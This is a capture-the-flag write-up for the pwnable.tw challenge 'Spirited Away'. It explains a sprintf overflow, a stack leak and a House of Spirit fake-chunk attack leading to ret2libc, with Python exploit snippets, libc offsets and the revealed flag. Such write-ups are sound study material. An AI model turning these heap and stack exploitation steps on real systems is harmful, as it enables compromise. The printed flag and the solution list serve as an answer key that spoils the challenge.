---
tags:
  - house-of-spirit
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An off-by-one size error enables forging fake chunk headers on the stack, triggering House of Spirit via free() to overwrite the return address."
proof-of-concept: no
---

# Spirited Away — pwnable.tw (300 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10204`
>
> Flag: `FLAG{Gue55_the_answer_isn't_always_Y3S}`

## Challenge Overview

A 32-bit movie comment survey program (i386, no PIE, Partial RELRO, NX, Stack Canary) built against glibc 2.23. In a loop, the user is asked for name, age, reason, and comment. After each entry, they can choose to leave another comment. A global counter tracks total comments.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## Program Logic (Pseudocode)

```c
void survey() {
    char sprintf_buf[0x38];     // ebp-0xe8
    uint32_t name_comment_len;  // ebp-0xb0, initialized to 0x3c (60)
    uint32_t reason_len;        // ebp-0xac, initialized to 0x50 (80)
    char reason[0x50];          // ebp-0xa8 .. ebp-0x58
    char comment[0x3c];         // ebp-0x58 .. ebp-0x1c (approx)
    char *name_ptr;             // ebp-0x54 (malloc'd heap pointer)

    name_comment_len = 0x3c;
    reason_len = 0x50;

    while (1) {
        name_ptr = malloc(0x3c);
        read(0, name_ptr, name_comment_len);     // name
        scanf("%d", &age);                         // age
        read(0, reason, reason_len);               // reason
        read(0, comment_buf, name_comment_len);    // comment (reuses name_comment_len!)

        printf("Name: %s\nReason: %s\n...", name_ptr, reason);

        // BUG: sprintf can overflow into name_comment_len
        sprintf(sprintf_buf, "%d comment so far. We will review ...", ++cnt);

        free(name_ptr);

        read(0, &choice, 1);
        if (choice == 'n') return;  // returns to main → exit
    }
}
```

## Vulnerabilities

### V1 — `sprintf` Overflow Corrupts `name_comment_len` (Primary, Exploitable)

**Root Cause:** The `sprintf_buf` at `ebp-0xe8` is ~56 bytes, and the `name_comment_len` variable sits at `ebp-0xb0`. The sprintf format string `"%d comment so far. We will review them as soon as we can"` is 57+ characters. When `cnt` grows from 1 digit to 2 digits (count=10), the NUL terminator spills onto `name_comment_len`, setting it to **0**. When `cnt` reaches 3 digits (count=100), the trailing `"...can\0"` writes `'n' = 0x6e` (110) into `name_comment_len`.

```
sprintf_buf layout (cnt=100):
  ebp-0xe8: "100 comment so far. We will review them as soon as we can\0"
                                                                    ^
                                                          ebp-0xb0 = 0x6e ('n')
```

**Phase 1 (cnt 10–99):** `name_comment_len = 0` → name and comment `read()` calls consume 0 bytes (effectively skipped). Age and reason still work normally.

**Phase 2 (cnt ≥ 100):** `name_comment_len = 0x6e` (110) → name and comment reads are now **much larger** than the original 0x3c (60). The comment buffer is only ~60 bytes before reaching the `name_ptr` variable on the stack → **comment read overflows into `name_ptr`**.

**Impact:** The attacker controls the `name_ptr` (heap pointer) that gets `free()`'d and then `malloc()`'d on the next iteration. This enables **House of Spirit**: point `name_ptr` at a fake fastbin chunk on the stack, free it, then malloc returns a stack pointer — the next name read writes directly to the stack.

### V2 — `printf("%s", reason)` Leaks Stack/libc (Exploitable)

**Root Cause:** The `reason` buffer at `ebp-0xa8` is read with `read(0, reason, 0x50)` but never NUL-terminated. `printf("Reason: %s", reason)` prints past the 0x50 bytes into whatever follows on the stack.

```
Stack layout after reason buffer:
  ebp-0xa8: reason[0x50]
  ebp-0x58: ... (comment area / other locals)
  ...
  ebp+0x00: saved_ebp          ← leaked (stack address)
  ebp+0x04: saved_eip = 0x08048908  ← leaked (return into main, constant)
  ebp+0x08: stdout FILE*       ← leaked (libc address)
```

**Impact:** By filling reason with exactly 0x50 bytes (no newline), the `%s` format leaks:
- **`saved_ebp`** → stack address (used to calculate the fake chunk target)
- **`0x08048908`** → anchor value (survey's return address into main, confirms alignment)
- **`stdout` (`_IO_2_1_stdout_`)** → libc address (subtract known offset → libc base)

Some solvers get a shorter leak by filling reason with fewer bytes (e.g., 56 bytes to only leak the libc pointer through `_IO_file_sync`/`fflush` residue), depending on exact stack layout.

### V3 — Heap Pointer on Stack → House of Spirit (Enabler)

The `name_ptr` variable at `ebp-0x54` holds a `malloc`'d pointer that is `free()`'d each iteration and re-`malloc()`'d at the start of the next. Since V1 lets us overwrite `name_ptr` via the comment overflow, we can:

1. Point `name_ptr` at a **fake fastbin chunk** we've placed in the `reason` buffer on the stack
2. The subsequent `free(name_ptr)` inserts this fake chunk into the 0x40 fastbin
3. The next `malloc(0x3c)` returns the stack address
4. The next `read(0, name_ptr, 0x6e)` writes up to 110 bytes starting from the stack fake chunk → overwrites `saved_eip`

## Exploit Flow (All Solutions)

Every solution follows the same fundamental chain. Differences are minor (leak offsets, padding, one_gadget vs ret2libc).

### Step 1 — Leak Stack + libc (Iteration 1)

Fill `reason` with 0x50 bytes (or a shorter marker + padding). Read back the `%s` leak to extract `saved_ebp` (stack) and `_IO_2_1_stdout_` (libc).

```python
# Fill reason fully → leak stack and libc
send_name("A")
send_age("1\n")
send_reason("A" * 0x50)      # no NUL terminator
send_comment("C")
# parse: saved_ebp, return_addr (0x08048908), stdout pointer
```

### Step 2 — Overflow `name_comment_len` (Iterations 2–100)

Send 99 more comments to increment `cnt` from 1 to 100:
- Iterations 2–10: normal (len=0x3c), send all four fields
- Iterations 11–100: len=0 (NUL-overwritten), name and comment reads are skipped; only send age + reason + choice

```python
for i in range(2, 11):
    send_all_fields("a", "1\n", "x", "c"); send_choice("y")
for i in range(11, 101):
    # len=0: name/comment reads consume nothing
    send_age("1\n"); send_reason("x"); send_choice("y")
# cnt is now 100 → name_comment_len = 0x6e
```

### Step 3 — Forge Fake Chunk + Redirect `name_ptr` (Iteration 101)

Place a fake 0x40 fastbin chunk in the `reason` buffer and overflow `name_ptr` via the now-oversized comment read:

```python
# Fake chunk in reason buffer (ebp-0xa8):
#   prev_size=0, size=0x41, data[0x38], next_size=0x41
reason = p32(0) + p32(0x41) + "X"*0x38 + p32(0) + p32(0x41)

# Overflow comment → overwrite name_ptr with address of fake chunk
comment = "Q"*0x54 + p32(fake_chunk_addr)

# Send and answer "y" → free(name_ptr) pushes fake chunk to fastbin
```

### Step 4 — Stack Write → ret2libc / one_gadget (Iteration 102)

`malloc(0x3c)` returns the stack fake chunk. The name `read()` now writes 0x6e bytes onto the stack starting from the fake chunk, reaching `saved_eip`:

```python
# Overwrite saved_eip with system() and "/bin/sh" argument:
name = "A"*0x4c + p32(system) + p32(junk) + p32(binsh_addr)
send_name(name)
# ... fill remaining fields ...
send_choice("n")  # survey() returns → system("/bin/sh")
```

### Alternative Finishes

| Technique | Description | Used by |
|-----------|-------------|---------|
| `ret2libc: system("/bin/sh")` | Classic 32-bit ret2libc with libc `/bin/sh` string | Most solutions |
| `one_gadget` | Single gadget (e.g., `0x3a819`, `0x5f065`) in saved_eip | 1006, 1727, 7905 |
| `ROP → read() → puts(GOT) → system()` | Multi-stage ROP to leak libc at runtime + pivot | 1913 |
| `"/bin/sh"` on stack | Place `/bin/sh` string on stack, point `system` arg there | 17048 |

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc leak (`_IO_2_1_stdout_`) | V2: `printf("%s", reason)` no NUL terminator | Deterministic |
| Stack leak (`saved_ebp`) | V2: same `%s` leak | Deterministic |
| `name_comment_len` corruption (0→0x6e) | V1: `sprintf` overflow at cnt=100 | Deterministic |
| `name_ptr` overwrite | V1-enabled comment overflow | Deterministic |
| Fake fastbin chunk (House of Spirit) | V3: forge chunk in reason buffer | Deterministic |
| Stack write (saved_eip overwrite) | malloc returns stack; name read overwrites ret | Deterministic |

## Key Stack Layout

```
ebp-0xe8: sprintf_buf[0x38]       ← "%d comment so far..."
ebp-0xb0: name_comment_len        ← overwritten by sprintf NUL/tail
ebp-0xac: reason_len (0x50)
ebp-0xa8: reason[0x50]            ← fake chunk placed here
ebp-0x58: comment/name_ptr area
ebp-0x54: name_ptr (heap)         ← overwritten via comment overflow
  ...
ebp+0x00: saved_ebp               ← leaked via V2
ebp+0x04: saved_eip (0x08048908)  ← overwritten to system() / one_gadget
ebp+0x08: stdout FILE*            ← leaked via V2 (libc anchor)
```

## Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
_IO_2_1_stdout_ = 0x1b0d60
system          = 0x3a940
bin_sh          = 0x158e8b
# one_gadgets (from one_gadget tool):
one_gadgets     = [0x3a819, 0x3a81c, 0x5f065, 0x5f066]
```

## Solution Write-ups

| File | Key Technique | Notes |
|------|---------------|-------|
| `1006.md` | sprintf overflow → House of Spirit → one_gadget | Leaks stack via reason overflow; GOT read for libc |
| `1172.md` | sprintf overflow → fake chunk → system("/bin/sh") | Clean code; single-iteration leak |
| `1269.md` | sprintf overflow → House of Spirit → one_gadget | Detailed helper functions; two-phase leak |
| `1297.md` | sprintf overflow → fake chunk → system+exit+binsh | Full ret2libc with clean exit |
| `1303.md` | sprintf overflow → fake chunk → system | Messy parsing but works; raw hex leak |
| `1316.md` | sprintf overflow → House of Spirit → system+exit+binsh | Clean exploit with proper recv handling |
| `1351.md` | sprintf overflow → fake chunk → system | Uses ntpwn library |
| `1384.md` | sprintf overflow → fake chunk → system | Minimal; uses fflush offset for libc leak |
| `1689.md` | sprintf overflow → fake chunk → system | Uses reason at various offsets for two-stage leak |
| `1727.md` | sprintf overflow → House of Spirit → one_gadget (0x5f065) | Verbose but well-structured |
| `1803.md` | sprintf overflow → fake chunk → system | Written in Ruby |
| `1913.md` | sprintf overflow → ROP chain (read→puts→system) | Multi-stage ROP; leaks libc via puts(GOT) at runtime |
| `10128.md` | sprintf overflow → fake chunk → system | Uses regex for leak parsing |
| `10840.md` | sprintf overflow → fake chunk → system | Detailed with proper fastbin next-size validation |
| `11445.md` | sprintf overflow → fake chunk → system | Short; anchors libc on `_IO_file_sync` offset |
| `11540.md` | sprintf overflow → fake chunk → system | Uses `interactive()` trick for scanf buffering |
| `13019.md` | sprintf overflow → House of Spirit → system | Detailed step-by-step with raw_input pauses |
| `14032.md` | sprintf overflow → fake chunk → system | Different libc version offsets (2.27 locally) |
| `14605.md` | sprintf overflow → fake chunk → system | Clean helper functions |
| `17048.md` | sprintf overflow → House of Spirit → system | Detailed telnetlib-based; places "/bin/sh" on stack |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (socket-based, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/spirited_away` | Challenge binary (i386, stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, 32-bit) |
| `solution/*.md` | Community write-ups (129 solutions) |
